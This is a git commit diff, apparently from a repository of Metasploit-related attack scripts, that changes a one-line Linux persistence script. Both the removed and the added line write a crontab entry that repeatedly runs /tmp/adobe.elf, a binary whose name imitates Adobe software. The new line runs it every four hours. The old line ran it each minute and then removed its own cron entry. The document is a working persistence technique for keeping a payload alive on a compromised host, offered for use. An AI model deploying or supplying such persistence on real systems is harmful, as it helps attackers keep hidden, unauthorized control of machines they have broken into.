6c76f650eb3b2ee8c9232d5b2609100b67533334
paulkwalton <43542501+paulkwalton@users.noreply.github.com>
2023-07-03 20:28:40 +0100

    Update msf-linux-cron-persistence.sh

--- linux/metasploit/msf-linux-cron-persistence.sh
+++ linux/metasploit/msf-linux-cron-persistence.sh
@@ -1,1 +1,2 @@
-(crontab -l 2>/dev/null; echo "* * * * * /tmp/adobe.elf && (crontab -l | grep -v '/tmp/adobe.elf') | crontab -") | crontab -
+(crontab -l 2>/dev/null; echo "0 */4 * * * /tmp/adobe.elf") | crontab -  # List current cron jobs, add new job, update cron table
+
